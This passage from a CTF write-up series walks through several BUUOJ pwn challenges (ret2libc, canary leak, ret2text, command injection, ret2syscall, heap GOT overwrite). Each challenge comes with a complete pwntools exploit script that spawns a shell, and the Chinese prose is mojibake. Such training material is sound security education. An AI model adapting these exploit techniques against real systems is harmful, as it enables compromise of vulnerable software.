class="built_in">int</span>, descryption</span>):</span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size of description: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;name: &quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text: &quot;</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, length:<span class="built_in">int</span>, descryption</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text: &quot;</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    big_size = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span></span><br><span class="line">    padding_length = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x10</span> + <span class="number">8</span></span><br><span class="line">    new(big_size, <span class="string">&quot;arttnba3&quot;</span>, padding_length + <span class="number">4</span>, <span class="string">b&#x27;A&#x27;</span> * padding_length + p32(e.got[<span class="string">&#x27;free&#x27;</span>])) <span class="comment"># idx 3</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;description: &quot;</span>)</span><br><span class="line">    free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x10</span>, p32(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2020/12/04/V4Io3j6Zyqaipx5.png" alt="image.png"></p>
<blockquote>
<p>ä»¥å‰åšå †éƒ½æ˜¯64ä½èµ·æ‰‹ï¼Œè¿™32ä½çš„å †é¢˜å±å®æŠŠæˆ‘å‘åˆ°äº†ï¼Œ<del>æˆ‘æ„£æ˜¯æ‹¿ç€64ä½çš„libcæ€¼äº†åŠå¤©ï¼Œä»¥åŠæ¯«ä¸æ€ç´¢å°±å†™çš„0x10çš„chunkå¤´</del></p>
<p>æœ¬é¢˜åŸé¢˜æ¥è‡ªäºC3CTFï¼Œæ­ªå›½äººçš„é¢˜ç›®è´¨é‡å…¶å®è¿˜æ˜¯å¯ä»¥çš„ï¼ˆå½“ç„¶ç°åœ¨æˆ‘ä¹Ÿå°±åªèƒ½å†™å¾—å‡ºç­¾åˆ°é¢˜233333</p>
</blockquote>
<h2 id="0x027-picoctf-2018-rop-chain-ret2libc"><a href="#0x027-picoctf-2018-rop-chain-ret2libc" class="headerlink" title="0x027.picoctf_2018_rop chain - ret2libc"></a>0x027.picoctf_2018_rop chain - ret2libc</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œ åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/04/4g6RJGxlf73ZTAB.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/04/fBGecSvgaFmsdCb.png" alt="image.png"></p>
<p>å¾ˆå¤§å¾ˆç›´æ¥çš„ä¸€ä¸ªæº¢å‡ºçš„æ¼æ´</p>
<p>ç”±äºæ²¡æœ‰èƒ½ç›´æ¥getshellçš„gadgetï¼Œè¿˜æ˜¯è€ƒè™‘ret2libcï¼šæ„é€ ropé“¾æ³„éœ²libcåŸºå€åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./PicoCTF_2018_rop_chain&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;, 28376)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./PicoCTF_2018_rop_chain&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2020/12/04/GmnYAjS7r6DUbpC.png" alt="image.png"></p>
<h2 id="0x028-bjdctf-2020-babyrop2-fmtstr-ret2libc"><a href="#0x028-bjdctf-2020-babyrop2-fmtstr-ret2libc" class="headerlink" title="0x028.bjdctf_2020_babyrop2 - fmtstr + ret2libc"></a>0x028.bjdctf_2020_babyrop2 - fmtstr + ret2libc</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p>
<p><img src="https://i.loli.net/2020/12/04/uH6V1kLP3M5TizI.png" alt="image.png"></p>
<p>åœ¨giftå‡½æ•°ä¸­å¯ä»¥æ³„éœ²canary</p>
<p><img src="https://i.loli.net/2020/12/04/K7psfAMFocnalTy.png" alt="image.png"></p>
<p>åœ¨vulnä¸­ç›´æ¥å°±æœ‰ä¸€ä¸ªæº¢å‡º</p>
<p><img src="https://i.loli.net/2020/12/04/XHYVtGCxol92dNE.png" alt="image.png"></p>
<p>é‚£ä¹ˆå…ˆæ³„éœ²canaryå†ret2libcå³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;, 26028)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop2&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x20</span> - <span class="number">8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400993</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * offset + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.sym[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;A&#x27;</span> * offset + p64(canary) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/12/04/rScmVH2X87ob5iB.png" alt="image.png"></p>
<h2 id="0x029-jarvisoj-test-your-memory-ret2text"><a href="#0x029-jarvisoj-test-your-memory-ret2text" class="headerlink" title="0x029.jarvisoj_test_your_memory - ret2text"></a>0x029.jarvisoj_test_your_memory - ret2text</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œ åªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/04/RuA5Pk3QrJqXKHd.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/04/IefOqdQ4E6yBMKZ.png" alt="image.png"></p>
<p>å­˜åœ¨æº¢å‡º</p>
<p><img src="https://i.loli.net/2020/12/04/gXN7KSE3T4dzLob.png" alt="image.png"></p>
<p>å­˜åœ¨systemå‡½æ•°</p>
<p><img src="https://i.loli.net/2020/12/04/l7ST1q2FcrGWbUM.png" alt="image.png"></p>
<p>å­˜åœ¨ä¸€ä¸ª<code>cat flag</code>å­—ç¬¦ä¸²</p>
<p>é‚£ç›´æ¥system(â€œcat flagâ€)å°±è¡Œäº†</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29485</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./memory&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x13</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.sym[<span class="string">&#x27;system&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;puts&#x27;</span>]) + p32(<span class="number">0x080487E0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯å¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/12/04/uZlcnrhgJo23zpW.png" alt="image.png"></p>
<blockquote>
<p>æ³¨ï¼šè¿™é“é¢˜å¾ˆå‘ï¼Œé¢˜ç›®ç»™çš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œéƒ¨ç½²åœ¨æœåŠ¡å™¨ä¸Šçš„äºŒè¿›åˆ¶æ–‡ä»¶å¤§ç›¸å¾„åº­ï¼Œæ‰€ä»¥æ²¡èƒ½get shellâ€¦</p>
</blockquote>
<h2 id="0x02A-bjdctf-2020-router-LinuxåŸºç¡€çŸ¥è¯†"><a href="#0x02A-bjdctf-2020-router-LinuxåŸºç¡€çŸ¥è¯†" class="headerlink" title="0x02A.bjdctf_2020_router - LinuxåŸºç¡€çŸ¥è¯†"></a>0x02A.bjdctf_2020_router - LinuxåŸºç¡€çŸ¥è¯†</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œåªå¼€äº†NXä¿æŠ¤</p>
<p><img src="https://i.loli.net/2021/01/24/g94RfyUP5cjBTWb.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2021/01/24/xWrnYZtAyFBEuiV.png"></p>
<p>ç›´æ¥å¯ä»¥æ‰§è¡Œ<code>/bin/sh</code>ï¼Œåªéœ€è¦åŠ ä¸€ä¸ªåˆ†å·æŠŠå‰é¢çš„æŒ‡ä»¤åˆ†å‰²å¼€æ¥å³å¯</p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./bjdctf_2020_router&#x27;) # p = remote(&#x27;node3.buuoj.cn&#x27;, 25537)</span><br><span class="line">p.sendline(b&#x27;1&#x27;)</span><br><span class="line">p.sendline(&#x27;;/bin/sh&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/24/rOeCuqy3h5GcVXb.png"></p>
<blockquote>
<p>è¿™æ˜¯ä¸ªğŸ”¨pwné¢˜</p>
</blockquote>
<h2 id="0x02B-picoctf-2018-buffer-overflow-1-ret2libc"><a href="#0x02B-picoctf-2018-buffer-overflow-1-ret2libc" class="headerlink" title="0x02B.picoctf_2018_buffer overflow 1 - ret2libc"></a>0x02B.picoctf_2018_buffer overflow 1 - ret2libc</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å…³ï¼Œæ˜ç¤ºæˆ‘ä»¬å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºâ¤</p>
<p><img src="https://i.loli.net/2021/01/24/bpRQ9TfLImGh5Ud.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/01/24/rBL1ZMCpcwq5PAt.png"></p>
<p>ç›´æ¥ret2libcå³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./PicoCTF_2018_buffer_overflow_1&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;,27965)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./PicoCTF_2018_buffer_overflow_1&#x27;</span>) </span><br><span class="line">offset = <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Jumping&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/24/6zNMAZF2D5gviUx.png"></p>
<h2 id="0x02C-ZJCTF-2019-Login-ret2text"><a href="#0x02C-ZJCTF-2019-Login-ret2text" class="headerlink" title="0x02C.[ZJCTF 2019]Login - ret2text"></a>0x02C.[ZJCTF 2019]Login - ret2text</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†nxå’Œcanary</p>
<p><img src="https://i.loli.net/2021/01/24/Wwh1C7PLf8TvUQS.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>åœ¨ä¸»å‡½æ•°ä¸­ä¼šå¯¹è¾“å…¥çš„usernameå’Œpasswordè¿›è¡Œæ ¡éªŒ</p>
<p><img src="https://i.loli.net/2021/01/24/BI5WtnFaPxsOV6b.png"></p>
<p>æ¼æ´ç‚¹åœ¨password_checker()å‡½æ•°ï¼Œä¼šæ‰§è¡Œcall rax</p>
<p><img src="https://i.loli.net/2021/01/24/peyRXzO3iUbAv1s.png"></p>
<p>æˆ‘ä»¬å°è¯•å¯¹è¯¥å€¼è¿›è¡Œæº¯æºï¼Œå…¶æ¥è‡ªäºpassword_checker()å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°</p>
<p><img src="https://i.loli.net/2021/01/24/LwAsFefMrKRh1GD.png"></p>
<p>è¿™ä¸ªå‚æ•°æ¥è‡ªäºä¸Šå±‚è°ƒç”¨å‡½æ•°æ ˆä¸Šçš„rbp - 0x130çš„ä½ç½®</p>
<p><img src="https://i.loli.net/2021/01/24/5IEbsfP9KpqXUtB.png"></p>
<p>è¿™ä¸ªä½ç½®ä¸Šçš„æ•°å€¼æ¥è‡ªäºå¦ä¸€ä¸ªpassword_checker()å‡½æ•°çš„è¿”å›å€¼</p>
<p><img src="https://i.loli.net/2021/01/24/ZjD57IMaEoYrXeA.png"></p>
<p>æœ€ç»ˆæˆ‘ä»¬å¾—çŸ¥è¯¥å€¼åº”å½“æ¥è‡ªäºå‡½æ•°è°ƒç”¨æ ˆä¸Šçš„rbp - 0x18çš„ä½ç½®</p>
<p><img src="https://i.loli.net/2021/01/24/5w9u7Pn1kgfWXCD.png"></p>
<p>åœ¨è¾“å…¥passwordçš„æ—¶å€™æˆ‘ä»¬æ˜¯ä»åŒä¸€ä¸ªæ ˆä½ç½®ï¼ˆåŒä¸€å±‚çº§çš„å‡½æ•°è°ƒç”¨ä½¿ç”¨å§‹äºç›¸åŒä½ç½®çš„æ ˆç©ºé—´ï¼‰çš„rbp - 0x60çš„ä½ç½®è¾“å…¥çš„ï¼Œè™½ç„¶ä½¿ç”¨äº†fgetsä½†æ˜¯è¦†å†™æ‰è¿™ä¸ªä½ç½®ç»°ç»°æœ‰ä½™</p>
<p><img src="https://i.loli.net/2021/01/24/ume32NkDLdHgcyJ.png"></p>
<p>åŒæ—¶ç¨‹åºä¸­å­˜åœ¨ç€å¯ä»¥ç›´æ¥get shellçš„gadget</p>
<p><img src="https://i.loli.net/2021/01/24/NPusUMrcaLBV4jI.png"></p>
<p>æ•…ç›´æ¥æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./login&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 27754)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">password = <span class="string">b&#x27;2jctf_pa5sw0rd&#x27;</span></span><br><span class="line">p.sendline(password + <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x60</span> - <span class="number">0x18</span> - <span class="built_in">len</span>(password)) + p64(<span class="number">0x400e9e</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/24/vK2ZOVGHPorT9S8.png"></p>
<h2 id="0x02D-cmcc-simplerop-ret2syscall-ret2shellcode"><a href="#0x02D-cmcc-simplerop-ret2syscall-ret2shellcode" class="headerlink" title="0x02D.cmcc_simplerop -ret2syscall | ret2shellcode"></a>0x02D.cmcc_simplerop -ret2syscall | ret2shellcode</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œåªå¼€äº†NX</p>
<p><img src="https://i.loli.net/2021/01/24/MeNbx8a1dowJgKW.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/01/24/tWg4ka2Zo6J7fUR.png"></p>
<p>ä½†æ˜¯ç¨‹åºæœ¬èº«æ˜¯ç»è¿‡é™æ€ç¼–è¯‘çš„ï¼Œå› æ­¤æ²¡æ³•ç›´æ¥é€šè¿‡å¸¸è§„çš„ret2libcæ¥get shell</p>
<h3 id="è§£æ³•ä¸€ï¼šret2syscall"><a href="#è§£æ³•ä¸€ï¼šret2syscall" class="headerlink" title="è§£æ³•ä¸€ï¼šret2syscall"></a>è§£æ³•ä¸€ï¼šret2syscall</h3><p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨ç¨‹åºä¸­å­˜åœ¨å¯ä»¥è¿›è¡Œç³»ç»Ÿè°ƒç”¨çš„<code>int 0x80</code>ä¸­æ–­æŒ‡ä»¤</p>
<p><img src="https://i.loli.net/2021/01/24/YGV1INJTXhH4SLQ.png"></p>
<p>æ•…è€ƒè™‘é€šè¿‡0x80å·ä¸­æ–­æ‰§è¡Œ11å·ç³»ç»Ÿè°ƒç”¨<code>execve(&quot;/bin/sh&quot;, 0, 0)</code>ä»¥get shellï¼Œå…¶ä¸­å­—ç¬¦ä¸²æˆ‘ä»¬æ˜¯å¯ä»¥æ‰‹åŠ¨è¯»å…¥åˆ°bssæ®µä¸Šçš„</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯æ ˆä¸Šå‚æ•°éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨è¿›è¡Œå¼¹å‡º</p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29872</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./simplerop&#x27;</span>) </span><br><span class="line">pop_esi_pop_edi_pop_ebp_ret = <span class="number">0x0804838c</span></span><br><span class="line">pop_edi_pop_ebp_ret = <span class="number">0x0804838d</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_ecx_pop_ebx_ret = <span class="number">0x0806e851</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806e82a</span></span><br><span class="line">int_0x80 = <span class="number">0x080493e1</span></span><br><span class="line">offset = <span class="number">0x1c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>)  + p32(e.sym[<span class="string">&#x27;read&#x27;</span>]) + p32(pop_esi_pop_edi_pop_ebp_ret) + p32(<span class="number">0</span>) + p32(e.bss()) + p32(<span class="number">0x8</span>) + p32(pop_eax_ret) + p32(<span class="number">0xb</span>) + p32(pop_ecx_pop_ebx_ret) + p32(<span class="number">0</span>) + p32(e.bss()) + p32(pop_edx_ret) + p32(<span class="number">0</span>) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2021/01/24/p7P53jJ6zKfxhtR.png"></p>
<h3 id="è§£æ³•äºŒï¼šret2shellcode"><a href="#è§£æ³•äºŒï¼šret2shellcode" class="headerlink" title="è§£æ³•äºŒï¼šret2shellcode"></a>è§£æ³•äºŒï¼šret2shellcode</h3><p>ç¨‹åºæœ¬èº«è¿˜å¸¦æœ‰mprotectå‡½æ•°ï¼Œæ•…è€ƒè™‘ä¿®æ”¹bssæ®µä¸ºå¯æ‰§è¡Œåè¯»å…¥shellcodeæ¥get shell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
